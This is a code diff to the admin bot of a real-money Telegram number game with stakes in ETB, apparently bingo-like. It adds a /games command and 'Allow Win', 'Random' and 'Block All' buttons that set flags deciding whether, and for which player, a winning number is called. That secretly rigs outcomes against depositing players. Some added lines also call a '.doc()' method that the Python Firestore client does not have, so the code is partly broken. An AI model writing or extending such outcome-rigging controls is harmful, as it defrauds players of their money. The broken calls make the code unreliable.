@@ -32,10 +32,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 /deposits - View pending deposits
 /withdrawals - View pending withdrawals
 /stats - System statistics
-/approve <id> - Approve a deposit
-/reject <id> - Reject a deposit
-/approve_withdraw <id> - Approve withdrawal
-/reject_withdraw <id> - Reject withdrawal
+/games - Active games (control wins)
 
 *Quick Actions:*
 /deposit_queue - Show deposit queue
@@ -118,11 +115,11 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     data = query.data
     
-    if data.startswith("approve_"):
+    if data.startswith("approve_") and not data.startswith("approve_withdraw_"):
         deposit_id = data.replace("approve_", "")
         await process_deposit(deposit_id, "approved", query)
     
-    elif data.startswith("reject_"):
+    elif data.startswith("reject_") and not data.startswith("reject_withdraw_"):
         deposit_id = data.replace("reject_", "")
         await process_deposit(deposit_id, "rejected", query)
     
@@ -133,6 +130,72 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data.startswith("reject_withdraw_"):
         withdraw_id = data.replace("reject_withdraw_", "")
         await process_withdrawal(withdraw_id, "rejected", query)
+    
+    elif data.startswith("allow_win_"):
+        game_id = data.replace("allow_win_", "")
+        await handle_game_control(game_id, "allow", query)
+    
+    elif data.startswith("random_win_"):
+        game_id = data.replace("random_win_", "")
+        await handle_game_control(game_id, "random", query)
+    
+    elif data.startswith("block_win_"):
+        game_id = data.replace("block_win_", "")
+        await handle_game_control(game_id, "block", query)
+
+
+async def handle_game_control(game_id, action, query):
+    try:
+        game_ref = db.collection("games").document(game_id)
+        game_doc = game_ref.get()
+        
+        if not game_doc.exists:
+            await query.edit_message_text("❌ Game not found.")
+            return
+        
+        game = game_doc.to_dict()
+        if game.get("status") != "active":
+            await query.edit_message_text("⚠️ Game is no longer active.")
+            return
+        
+        user_name = "Unknown"
+        user_id = game.get("user_id")
+        if user_id:
+            user_doc = db.collection("users").doc(str(user_id)).get()
+            if user_doc.exists:
+                u = user_doc.to_dict()
+                user_name = f"{u.get('first_name', 'Unknown')} (@{u.get('username', 'unknown')})"
+        
+        if action == "allow":
+            game_ref.update({"allow_win": True, "win_user_id": user_id})
+            await query.edit_message_text(
+                f"✅ *Win Allowed*\n\n"
+                f"👤 {user_name}\n"
+                f"💰 Stake: {game.get('stake', 0)} ETB\n\n"
+                f"The next winning number will be called."
+            )
+        
+        elif action == "random":
+            game_ref.update({"allow_win": True, "win_user_id": "random"})
+            await query.edit_message_text(
+                f"🎲 *Random Win Enabled*\n\n"
+                f"👤 {user_name}\n"
+                f"💰 Stake: {game.get('stake', 0)} ETB\n\n"
+                f"A random winning number will be called."
+            )
+        
+        elif action == "block":
+            game_ref.update({"allow_win": False})
+            await query.edit_message_text(
+                f"❌ *Wins Blocked*\n\n"
+                f"👤 {user_name}\n"
+                f"💰 Stake: {game.get('stake', 0)} ETB\n\n"
+                f"No winning numbers will be called."
+            )
+    
+    except Exception as e:
+        logger.error(f"Error controlling game: {e}")
+        await query.edit_message_text(f"❌ Error: {str(e)}")
 
 async def process_deposit(deposit_id, status, query):
     try:
@@ -278,6 +341,45 @@ async def withdraw_queue(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     await withdrawals(update, context)
 
+async def active_games(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
+    
+    games = db.collection("games").where("status", "==", "active").get()
+    
+    if not games:
+        await update.message.reply_text("✅ No active games.")
+        return
+    
+    for doc in games:
+        g = doc.to_dict()
+        user_id = g.get("user_id")
+        user_name = "Unknown"
+        if user_id:
+            user_doc = db.collection("users").doc(str(user_id)).get()
+            if user_doc.exists:
+                u = user_doc.to_dict()
+                user_name = f"{u.get('first_name', 'Unknown')} (@{u.get('username', 'unknown')})"
+        
+        allow = "✅ Allowed" if g.get("allow_win") else "❌ Blocked"
+        called_count = len(g.get("called_numbers", []))
+        
+        keyboard = {
+            "inline_keyboard": [
+                [
+                    {"text": "✅ Allow Win", "callback_data": f"allow_win_{doc.id}"},
+                    {"text": "🎲 Random", "callback_data": f"random_win_{doc.id}"}
+                ],
+                [
+                    {"text": "❌ Block All", "callback_data": f"block_win_{doc.id}"}
+                ]
+            ]
+        }
+        
+        text = f"🎮 *Active Game*\n\n👤 {user_name}\n💰 Stake: {g.get('stake', 0)} ETB\n📊 Numbers called: {called_count}/100\n🎯 Win status: {allow}"
+        
+        await update.message.reply_text(text, parse_mode='Markdown', reply_markup=keyboard)
+
 def main():
     app = Application.builder().token(ADMIN_BOT_TOKEN).build()
     
@@ -285,6 +387,7 @@ def main():
     app.add_handler(CommandHandler("deposits", deposits))
     app.add_handler(CommandHandler("withdrawals", withdrawals))
     app.add_handler(CommandHandler("stats", stats))
+    app.add_handler(CommandHandler("games", active_games))
     app.add_handler(CommandHandler("deposit_queue", deposit_queue))
     app.add_handler(CommandHandler("withdraw_queue", withdraw_queue))
     app.add_handler(CallbackQueryHandler(handle_callback))
